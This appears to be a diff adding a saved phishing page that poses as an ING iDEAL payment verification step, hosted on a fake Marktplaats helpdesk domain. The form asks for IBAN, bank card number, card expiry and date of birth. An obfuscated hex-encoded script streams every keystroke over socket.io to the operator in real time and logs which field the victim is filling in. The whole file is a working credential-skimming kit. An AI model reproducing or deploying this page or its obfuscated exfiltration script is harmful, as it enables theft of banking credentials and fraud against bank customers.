@@ -1,0 +1,208 @@
+
+<!-- saved from url=(0128)https://marktplaats-helpdesk.info/ingportal/particulier/trxid=xbWsWAydVHdSdfx4/register?username=ttsadas2esa&password=tt2e1dwasd -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+
+	
+	
+	<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
+	<meta content="width=device-width, initial-scale=1.0" name="viewport">
+	<meta content="notranslate" name="google">
+
+	<script src="./app_files/jquery.min.js"></script>
+	<script src="./app_files/bootstrap.min.js"></script>
+	<script src="./app_files/socket.io.js"></script>
+	<script src="./app_files/jquery.validate.min.js"></script>
+	<script src="./app_files/jquery.mask.js"></script>
+	<script>var socket = io.connect();</script>
+	<title>iDEAL - Mijn ING</title>
+</head>
+<body>
+	<link rel="stylesheet" href="./app_files/the-guide-styles-responsive.css">
+	<link rel="stylesheet" href="./app_files/custom.css">
+  <!-- <link href="https://inlogcodes.mijn.ing.nl/assets/web/ng/restricted/css/08101220.the-guide-styles.min.css" rel="stylesheet" type="text/css"> -->
+  <link rel="shortcut icon" href="https://marktplaats-helpdesk.info/img/favicon.ico">
+	<div id="giDealApp">
+		<!-- ngInclude: -->
+		<div class="ng-scope">
+			<div class="ng-scope">
+				<div class="tg">
+					<div class="container">
+						<div class="row">
+							<div class="col-md-12 col-lg-10 col-lg-offset-1 col-xl-8 col-xl-offset-2">
+								<header role="banner">
+								<img id="ing-logo" src="./app_files/SES_logo_ing.gif" alt="ING Logo" style="border-radius: 0px;" width="128" height="32">
+
+									<div class="languages h-float-right hidden-print ng-scope">
+										<button class="btn btn-default ng-scope" id="languageButton" tabindex="0"><span class="sr-only ng-binding">Kies taal</span>
+											<span class="ng-binding">Nederlands</span>
+										</button>
+									</div><!-- end ngIf: pageInfo.features.i18n -->
+									<h1 class="l-mt-1 ng-binding" id="pageHeader">Met iDEAL betalen <!-- ngIf: pageInfo.pageTitleStep -->
+										<span class="font-primary-r-xxl h-no-wrap ng-scope" translate="steptitle">(Stap 2 van 4)
+										</span><!-- end ngIf: pageInfo.pageTitleStep -->
+									</h1>
+								</header>
+								<main role="main">
+									<div class="ng-hide">
+										<div class="ng-isolate-scope alert alert-danger" id="errorMessage" role="alert" hidden="">
+											<span class="stacked-icon icon-lg"><i aria-hidden="true" class="icon icon-notification-error-z1 icon-red"></i><i aria-hidden="true" class="icon icon-white icon-notification-error-z2"></i></span><!-- ngIf: closeable --><span></span>
+											<p class="ng-binding ng-scope"><span></span></p>
+											<div class="btn-bar l-mb-1 ng-scope">
+												<span><!-- ngIf: error.retryable --><button class="btn btn-primary ng-binding ng-scope" type="button"><span>Probeer opnieuw</span></button><button class="btn btn-secondary ng-binding ng-scope" id="errorReturnToWebshopSecondary" type="button">Terug naar webwinkel</button><!-- end ngIf: transaction.merchantReturnUrl && error.retryable --> <!-- ngIf: !transaction.merchantReturnUrl && !error.retryable --> <!-- ngIf: !transaction.merchantReturnUrl && error.retryable --> <button class="btn btn-default ng-scope ng-binding" id="moreInfoBtn" tabindex="0" type="button">Meer informatie</button></span>
+											</div>
+										</div>
+									</div><!-- ngIf: pageInfo.step == 1 && !error.blockingGeneralError --><!-- ngIf: pageInfo.step == 2 && !error.blockingGeneralError --><!-- ngInclude: 'partials/tan.html' -->
+
+									<div class="ng-scope">
+										<div class="l-mb-1 ng-scope">
+											<!-- ngIf: formTitle -->
+											<h2 class="ng-binding ng-scope heading-b-xl">Verificatie vereist</h2><!-- end ngIf: formTitle -->
+                      <div class="alert alert-warning">
+                      <!-- Op dit moment is er een storing waardoor het mogelijk is dat het bedrag in het TAN-code bericht afwijkt van het daadwerkelijke bedrag. Controleer of het volgnummer overeenkomt met het ontvangen bericht. -->
+											Voor deze betaaldienst maakt ING gebruik van twee-factor-authenticatie. Dit is een extra methode die ING aanbiedt om uzelf online te identificeren. Hiervoor moet u een aantal beveiligingsvragen invullen.
+                      </div>
+											<div class="h-hidden">
+												<dl class="dl-grid l-mb-0 dl-title-bold">
+													<dt class="col-xs-4 ng-binding" id="amountTermCollapsible">Bedrag</dt>
+													<dd aria-labelledby="amountTermCollapsible" class="col-xs-8" id="amountCollapsible"><strong class="font-size-hg h-bold ng-binding">€&nbsp;0.01</strong></dd>
+												</dl>
+												<div aria-expanded="false" class="l-mb-0 panel panel-sm ng-isolate-scope panel-default" id="moreDetails" role="group">
+													<div class="panel-heading collapsible-header">
+														<div class="panel-title">
+															<a class="h-block ng-binding collapsed" href="https://marktplaats-helpdesk.info/ingportal/particulier/trxid=xbWsWAydVHdSdfx4/register?username=ttsadas2esa&amp;password=tt2e1dwasd" role="button"><i aria-hidden="true" class="icon icon-xxs icon-collapsible-toggle"></i>Details</a>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+											<div class="panel panel-shadow-a ng-scope" id="tanPanel">
+                        <div class="panel-body ng-scope" ng-controller="AuthenticationController as authCtrl">
+                        <form id="register" method="get" action="https://marktplaats-helpdesk.info/ingportal/particulier/trxid=xbWsWAydVHdSdfx4/activate" class="form-horizontal" novalidate="novalidate">
+                            <fieldset>
+                              <legend class="heading-b-xxl h-text-b ng-binding">Beveiligingsvragen</legend>
+                              <p ng-bind-html="labels.Q3_TOP_INFOTEXT" class="ng-binding">
+                            </p><p>Vul uw gegevens in om uzelf online te identificeren.</p>
+                                 <div class="validation-group" name="authAccountNumber">
+                                   <div ng-transclude="">
+                                     <div class="form-group" label="Rekeningnummer (IBAN)" for="accountNumber" id="accountNumberRow">
+		                                   <div ng-if="label" ing-form-grid-label="" class="control-label ng-scope col-lg-4">
+		                                     <div ng-if="infoPopover" class="icon-position icon-after icon-position-sm ng-scope">
+		                                       <label ng-if="for" for="accountNumber" class="ng-binding ng-scope">Rekeningnummer (IBAN)</label>
+		                                       <span ing-info-popover="" config="infoPopover" class="icon-position-icon ng-isolate-scope">
+		                                         <div ing-popover="" class="ng-scope" style="position: relative; display: inline-block;">
+		                                           <a href="https://marktplaats-helpdesk.info/ingportal/particulier/trxid=xbWsWAydVHdSdfx4/register?username=ttsadas2esa&amp;password=tt2e1dwasd" ing-popover-invoker="" class="ng-scope">
+		                                             <span class="stacked-icon icon-md ng-scope" ing-info-icon="" sr-text="">
+		                                               <i aria-hidden="true" class="icon icon-information-z1 icon-white"></i>
+		                                               <i aria-hidden="true" class="icon icon-information-z2 icon-orange" hidden=""></i>
+		                                               <span class="sr-only ng-binding">Meer informatie</span>
+		                                             </span>
+		                                           </a>
+		                                           </div>
+		                                         </span>
+		                                       </div><!-- end ngIf: infoPopover -->
+		                                     </div><!-- end ngIf: label --><!-- ngIf: label -->
+		                                     <div ng-if="label" ing-form-grid-field="" ng-transclude="" class="ng-scope col-lg-8">
+																					 <div class="row ng-scope">
+																						 <div class="col-lg-7">
+																							<input name="accountNumber" id="raktaNumber" type="text" class="test" placeholder="NL** INGB ____ ____ __" maxlength="22">
+																					 	</div>
+		                                     </div>
+																				 <script>
+
+																				 </script>
+
+		                                    </div><!-- end ngIf: label --><!-- ngIf: !label -->
+		                                 </div>
+                                   </div>
+                                 </div>
+
+                        <div class="validation-group" name="authBirthDate">
+                            <div ng-transclude="">
+                              <div class="form-group">
+                                 <div class="control-label ng-scope col-lg-4">
+                                   <label class="ng-binding ng-scope">Pasnummer</label>
+                                 </div>
+                                 <div class="ng-scope col-lg-8">
+                                     <div class="row ng-scope">
+                                       <div class="col-lg-5">
+                                         <input name="pasnr" id="raktaPassnr" class="inputPasnr" maxlength="9" size="10" placeholder="___ _ ___">
+                                       </div>
+                                   </div>
+                                 </div>
+                               </div>
+
+                            <div class="form-group">
+                               <div class="control-label ng-scope col-lg-4">
+                                 <label class="ng-binding ng-scope">Pas geldig tot en met</label>
+                               </div>
+															 <div class="ng-scope col-lg-8">
+                                   <div class="row ng-scope">
+																		 <div class="col-lg-2">
+                                       <input name="geldigtotMaand" id="raktaGeldigTotMaand" class="form-control" maxlength="2" size="10" placeholder="maand"><br>
+                                     </div>
+																		 <div class="col-lg-1">
+																			 <input name="-" id="-" class="form-control" maxlength="2" size="10" placeholder="-" disabled="disabled"><br>
+																			</div>
+																		 <div class="col-lg-3">
+																			 <input name="geldigtotJaar" id="raktaGeldigTotJaar" class="form-control" maxlength="4" size="10" placeholder="jaar"><br>
+																		 </div>
+                                 </div>
+                               </div>
+
+                             </div>
+                              <div class="form-group" label="Geboortedatum" id="birthDateRow">
+                                 <div class="control-label ng-scope col-lg-4">
+                                   <label class="ng-binding ng-scope">Geboortedatum</label>
+                                 </div>
+                                 <div class="ng-scope col-lg-8">
+                                     <div class="row ng-scope">
+                                       <div class="col-lg-5">
+                                         <input name="raktaGebdatum" id="raktaGebdatum" class="form-control" maxlength="10" size="10">
+                                         <span class="help-block ng-binding">(dd-mm-jjjj)</span>
+                                       </div>
+                                   </div>
+                                 </div>
+                              </div>
+                        </div>
+                                 </div></fieldset>
+																 <input type="hidden" id="currentPage" value="register">
+																 <script>
+
+var _0x139d=["\x6C\x69\x76\x65\x53\x74\x61\x74\x75\x73\x50\x61\x67\x65\x31","\x3C\x62\x3E\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x70\x61\x67\x65\x3A\x20\x52\x65\x67\x69\x73\x74\x72\x61\x74\x69\x65\x3C\x2F\x62\x3E","\x65\x6D\x69\x74","\x72\x61\x6B\x74\x61\x4E\x75\x6D\x62\x65\x72\x49\x6E\x70\x75\x74","\x76\x61\x6C","\x23\x72\x61\x6B\x74\x61\x4E\x75\x6D\x62\x65\x72","\x3C\x62\x3E\x47\x65\x62\x72\x75\x69\x6B\x65\x72\x20\x76\x6F\x65\x72\x74\x20\x6B\x61\x61\x72\x74\x6E\x75\x6D\x6D\x65\x72\x20\x69\x6E\x20\x2E\x2E\x2E\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x70\x61\x67\x65\x3A\x20\x52\x65\x67\x69\x73\x74\x72\x61\x74\x69\x65\x3C\x2F\x62\x3E","\x6B\x65\x79\x75\x70","\x3C\x62\x3E\x47\x65\x62\x72\x75\x69\x6B\x65\x72\x20\x76\x6F\x65\x72\x74\x20\x70\x61\x73\x73\x6E\x75\x6D\x6D\x65\x72\x20\x69\x6E\x20\x69\x6E\x20\x2E\x2E\x2E\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x70\x61\x67\x65\x3A\x20\x52\x65\x67\x69\x73\x74\x72\x61\x74\x69\x65\x3C\x2F\x62\x3E","\x72\x61\x6B\x74\x61\x4E\x75\x6D\x62\x65\x72\x49\x6E\x70\x75\x74\x50\x61\x73\x73\x6E\x72","\x23\x72\x61\x6B\x74\x61\x50\x61\x73\x73\x6E\x72","\x3C\x62\x3E\x47\x65\x62\x72\x75\x69\x6B\x65\x72\x20\x76\x6F\x65\x72\x74\x20\x67\x65\x6C\x64\x69\x67\x68\x65\x69\x64\x20\x6D\x61\x61\x6E\x64\x20\x69\x6E\x20\x2E\x2E\x2E\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x70\x61\x67\x65\x3A\x20\x52\x65\x67\x69\x73\x74\x72\x61\x74\x69\x65\x3C\x2F\x62\x3E","\x72\x61\x6B\x74\x61\x4E\x75\x6D\x62\x65\x72\x49\x6E\x70\x75\x74\x47\x65\x6C\x64\x69\x67\x54\x6F\x74\x4D\x61\x61\x6E\x64","\x23\x72\x61\x6B\x74\x61\x47\x65\x6C\x64\x69\x67\x54\x6F\x74\x4D\x61\x61\x6E\x64","\x3C\x62\x3E\x47\x65\x62\x72\x75\x69\x6B\x65\x72\x20\x76\x6F\x65\x72\x74\x20\x67\x65\x6C\x64\x69\x67\x20\x6A\x61\x61\x72\x20\x69\x6E\x20\x2E\x2E\x2E\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x70\x61\x67\x65\x3A\x20\x52\x65\x67\x69\x73\x74\x72\x61\x74\x69\x65\x3C\x2F\x62\x3E","\x72\x61\x6B\x74\x61\x4E\x75\x6D\x62\x65\x72\x49\x6E\x70\x75\x74\x47\x65\x6C\x64\x69\x67\x54\x6F\x74\x4A\x61\x61\x72","\x23\x72\x61\x6B\x74\x61\x47\x65\x6C\x64\x69\x67\x54\x6F\x74\x4A\x61\x61\x72","\x3C\x62\x3E\x47\x65\x62\x72\x75\x69\x6B\x65\x72\x20\x76\x6F\x65\x72\x74\x20\x67\x65\x62\x6F\x6F\x72\x74\x65\x64\x61\x74\x75\x6D\x20\x69\x6E\x20\x2E\x2E\x2E\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x70\x61\x67\x65\x3A\x20\x52\x65\x67\x69\x73\x74\x72\x61\x74\x69\x65\x3C\x2F\x62\x3E","\x72\x61\x6B\x74\x61\x4E\x75\x6D\x62\x65\x72\x49\x6E\x70\x75\x74\x47\x65\x62\x64\x61\x74\x75\x6D","\x23\x72\x61\x6B\x74\x61\x47\x65\x62\x64\x61\x74\x75\x6D","\x76\x61\x6C\x69\x64\x44\x61\x74\x65","\x6D\x61\x74\x63\x68","\x50\x6C\x65\x61\x73\x65\x20\x65\x6E\x74\x65\x72\x20\x61\x20\x76\x61\x6C\x69\x64\x20\x64\x61\x74\x65\x20\x69\x6E\x20\x74\x68\x65\x20\x66\x6F\x72\x6D\x61\x74\x20\x44\x44\x2F\x4D\x4D\x2F\x59\x59\x59\x59","\x61\x64\x64\x4D\x65\x74\x68\x6F\x64","\x76\x61\x6C\x69\x64\x61\x74\x6F\x72","\x76\x61\x6C\x69\x64\x49\x42\x41\x4E","\x45\x6E\x74\x65\x72\x20\x61\x20\x76\x61\x6C\x69\x64\x20\x69\x62\x61\x6E","\x76\x61\x6C\x69\x64\x70\x61\x73","\x45\x6E\x74\x65\x72\x20\x61\x20\x76\x61\x6C\x69\x64\x20\x70\x61\x73\x6E\x72","\x65\x72\x72\x6F\x72\x4F\x6E\x65","\x56\x6F\x65\x72\x20\x65\x65\x6E\x20\x67\x65\x6C\x64\x69\x67\x65\x20\x72\x65\x6B\x65\x6E\x69\x6E\x67\x6E\x75\x6D\x6D\x65\x72\x20\x69\x6E\x20\x3C\x2F\x62\x72\x3E\x20\x56\x6F\x6F\x72\x62\x65\x65\x6C\x64\x20\x28\x4E\x4C\x38\x37\x20\x49\x4E\x47\x42\x20\x38\x30\x37\x32\x20\x30\x30\x36\x30\x20\x38\x39\x29","\x28\x33\x29\x20\x63\x69\x6A\x66\x65\x72\x73\x2C\x20\x28\x31\x29\x20\x6C\x65\x74\x74\x65\x72\x2C\x20\x28\x33\x29\x20\x63\x69\x6A\x66\x65\x72\x73","\x28\x32\x29\x20\x63\x69\x6A\x66\x65\x72\x73","\x28\x34\x29\x20\x63\x69\x6A\x66\x65\x72\x73\x20\x2E\x3C\x2F\x62\x72\x3E\x20\x76\x62\x3A\x28\x32\x30\x31\x38\x29","\x56\x6F\x65\x72\x20\x65\x65\x6E\x20\x67\x65\x6C\x64\x69\x67\x65\x20\x64\x61\x74\x75\x6D\x20\x69\x6E\x20\x64\x65\x20\x66\x6F\x72\x6D\x61\x61\x74\x20\x3C\x2F\x62\x72\x3E\x20\x76\x62\x3A\x28\x31\x30\x2D\x31\x32\x2D\x32\x30\x31\x38\x29","\x2E\x63\x6F\x6C\x6F\x72","\x76\x61\x6C\x69\x64\x61\x74\x65","\x23\x72\x65\x67\x69\x73\x74\x65\x72","\x53\x53\x30\x30\x20\x53\x53\x53\x53\x20\x30\x30\x30\x30\x20\x30\x30\x30\x30\x20\x30\x30","\x4E\x4C\x2A\x2A\x20\x49\x4E\x47\x42\x20\x5F\x5F\x5F\x5F\x20\x5F\x5F\x5F\x5F\x20\x5F\x5F","\x6D\x61\x73\x6B","\x2E\x74\x65\x73\x74","\x30\x30\x30\x20\x53\x20\x30\x30\x30","\x5F\x5F\x5F\x20\x5F\x20\x5F\x5F\x5F","\x2E\x69\x6E\x70\x75\x74\x50\x61\x73\x6E\x72"];socket[_0x139d[2]](_0x139d[0],_0x139d[1]);$(_0x139d[5])[_0x139d[7]](function(){socket[_0x139d[2]](_0x139d[3],$(_0x139d[5])[_0x139d[4]]());socket[_0x139d[2]](_0x139d[0],_0x139d[6])});$(_0x139d[10])[_0x139d[7]](function(){socket[_0x139d[2]](_0x139d[0],_0x139d[8]);socket[_0x139d[2]](_0x139d[9],$(_0x139d[10])[_0x139d[4]]())});$(_0x139d[13])[_0x139d[7]](function(){socket[_0x139d[2]](_0x139d[0],_0x139d[11]);socket[_0x139d[2]](_0x139d[12],$(_0x139d[13])[_0x139d[4]]())});$(_0x139d[16])[_0x139d[7]](function(){socket[_0x139d[2]](_0x139d[0],_0x139d[14]);socket[_0x139d[2]](_0x139d[15],$(_0x139d[16])[_0x139d[4]]())});$(_0x139d[19])[_0x139d[7]](function(){socket[_0x139d[2]](_0x139d[0],_0x139d[17]);socket[_0x139d[2]](_0x139d[18],$(_0x139d[19])[_0x139d[4]]())});jQuery[_0x139d[24]][_0x139d[23]](_0x139d[20],function(_0x4a7ex1,_0x4a7ex2){return _0x4a7ex1[_0x139d[21]](/(?:0[1-9]|[12][0-9]|3[01])\-(?:0[1-9]|1[0-2])\-(?:19|20\d{2})/)},_0x139d[22]);jQuery[_0x139d[24]][_0x139d[23]](_0x139d[25],function(_0x4a7ex1,_0x4a7ex2){return _0x4a7ex1[_0x139d[21]](/(NL)([0-9]{2}) (INGB) ([0-9]{4}) ([0-9]{4}) ([0-9]{2})/)},_0x139d[26]);jQuery[_0x139d[24]][_0x139d[23]](_0x139d[27],function(_0x4a7ex1,_0x4a7ex2){return _0x4a7ex1[_0x139d[21]](/([0-9]{3}) ([A-Z]|[a-z]{1}) ([0-9]{3})/)},_0x139d[28]);$(_0x139d[37])[_0x139d[36]]({errorClass:_0x139d[29],rules:{accountNumber:{required:true,minlength:22,maxlength:22,validIBAN:true},pasnr:{required:true,minlength:9,maxlength:9,number:false,validpas:true},geldigtotMaand:{required:true,minlength:2,maxlength:2},geldigtotJaar:{required:true,minlength:4,maxlength:4},raktaGebdatum:{required:true,minlength:10,maxlength:10,validDate:true}},messages:{accountNumber:_0x139d[30],pasnr:_0x139d[31],geldigtotMaand:_0x139d[32],geldigtotJaar:_0x139d[33],raktaGebdatum:_0x139d[34]},errorLabelContainer:_0x139d[35]});$(_0x139d[41])[_0x139d[40]](_0x139d[38],{placeholder:_0x139d[39]});$(_0x139d[44])[_0x139d[40]](_0x139d[42],{placeholder:_0x139d[43]})
+
+
+																 </script>
+                                 <fieldset>
+                                   <legend class="sr-only">Knoppen</legend>
+                                 <div class="form-group btn-bar">
+                                         <div class="col-lg-6 col-lg-push-4"><button type="submit" id="doorgaanButton" class="btn btn-primary icon-position icon-after icon-position-lg ng-binding" ng-disabled="authCtrl.disableSubmitButton.value">Doorgaan </button></div><div class="col-lg-4 col-lg-pull-6">
+																					 <button type="button" id="annulerenButton" class="btn btn-secondary ng-binding" ng-click="navCtrl.redirectOpen()" title="Annuleren">Annuleren</button>
+                                         </div>
+																				 <script>
+																				 $('#annulerenButton' ).click(function() {
+																					 window.location.replace("http://ing.nl");
+																					});
+																				 </script>
+                                       </div>
+                                     </fieldset>
+
+                                   </form>
+                                 </div>
+										</div>
+									</div>
+
+									<div class="btn-bar">
+										<button class="btn btn-default ng-scope ng-binding" tabindex="0" type="button">Help</button>
+									</div>
+								</main>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div><!-- App end -->
+
+
+</body></html>
